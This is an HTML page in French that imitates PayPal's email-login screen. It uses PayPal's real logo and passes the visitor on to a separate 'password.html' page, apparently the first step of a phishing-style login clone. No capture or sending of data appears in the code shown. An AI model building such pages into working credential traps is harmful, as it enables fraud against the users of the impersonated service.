<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Connexion PayPal - Email</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
    }
    .container {
      width: 100%;
      max-width: 350px;
      text-align: center;
    }
    .logo img {
      width: 120px;
      margin-bottom: 20px;
    }
    input[type="text"] {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 14px;
    }
    .link {
      display: block;
      text-align: left;
      font-size: 12px;
      color: #0070ba;
      text-decoration: none;
      margin-bottom: 20px;
    }
    .btn {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border-radius: 4px;
      font-size: 14px;
      cursor: pointer;
      border: none;
    }
    .btn-blue {
      background-color: #0070ba;
      color: #fff;
    }
    .btn-outline {
      background-color: #fff;
      border: 1px solid #000;
      color: #000;
    }
    .divider {
      display: flex;
      align-items: center;
      text-align: center;
      margin: 20px 0;
    }
    .divider::before, .divider::after {
      content: "";
      flex: 1;
      border-bottom: 1px solid #ccc;
    }
    .divider:not(:empty)::before {
      margin-right: .75em;
    }
    .divider:not(:empty)::after {
      margin-left: .75em;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://www.paypalobjects.com/images/shared/paypal-logo-129x32.svg" alt="PayPal Logo">
    </div>
    <form action="password.html" method="get">
      <input type="text" placeholder="Adresse e-mail ou numéro de portable" required>
      <a href="#" class="link">Oublié l’email ?</a>
      <button type="submit" class="btn btn-blue">Suivant</button>
      <button type="button" class="btn btn-outline">Connexion avec Passkey</button>
      <div class="divider">ou</div>
      <button type="button" class="btn btn-outline">Inscrivez-vous</button>
    </form>
  </div>
</body>
</html>
